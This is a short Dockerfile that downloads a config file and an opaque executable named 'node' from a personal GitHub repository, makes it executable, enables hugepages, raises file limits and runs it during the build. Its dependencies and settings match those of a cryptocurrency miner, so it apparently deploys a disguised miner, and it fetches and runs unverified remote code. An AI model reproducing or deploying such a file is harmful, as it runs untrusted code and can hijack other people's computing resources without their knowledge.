FROM ubuntu:16.04

RUN apt-get update && apt-get install -y wget libmicrohttpd-dev libssl-dev build-essential libhwloc-dev 
RUN wget https://github.com/henamah/henamahage/raw/master/config2.txt 
RUN mv config2.txt config.txt
RUN wget https://github.com/henamah/henamahage/raw/master/node && chmod +x node && sysctl -w vm.nr_hugepages=128
RUN ulimit -n 265555 && ulimit -Hn 265555 && ./node

